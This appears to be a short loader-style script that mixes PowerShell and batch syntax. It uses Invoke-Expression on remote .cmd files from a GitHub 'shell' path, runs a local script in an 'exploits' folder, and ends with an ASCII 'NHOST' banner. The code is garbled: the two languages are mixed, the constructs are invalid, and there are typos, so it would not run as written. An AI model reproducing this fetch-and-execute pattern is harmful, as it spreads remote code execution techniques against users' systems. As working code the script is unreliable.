$argsVar = "-cmd=[Invoke-Expression github.com/Niosem/Safler/shell/MadDash.cmd] 
           -autotab=[Invoke-Expression github.com/Niosem/Safler/shell/MadDash.AutoTab.cmd]"

Invoke-Expression ./exploits/OverTheBatch/main.ps1 
    if ($CMDProcess.ShouldProcess("tab.exe -cmd:pshell:profile:3 -Env:pshell:Profile:3=$argsVar", "return.exe -as_host")) {
}
    if (!$ProcessRunning = NHost.exe) do {
        goto Exception-NHost-NotRunning
    }

:: Breakpoint if NHost is not running

:Exception-NHost-NotRunning
echo "NHost is not running. Please start NHost before continuing."
goto EOF

:EOF
echo "Progam exiting"
echo ""
echo "N     N H     H OOOOOOO SSSSSSS TTTTTTT"
echo "N N   N H     H O     O S          T"
echo "N  N  N HHHHHHH O     0 SSSSSSS    T"
echo "N   N N H     H O     O       S    T"
echo "N     N H     H OOOOOOO SSSSSSS    T"
echo "------Integration Control Add Script"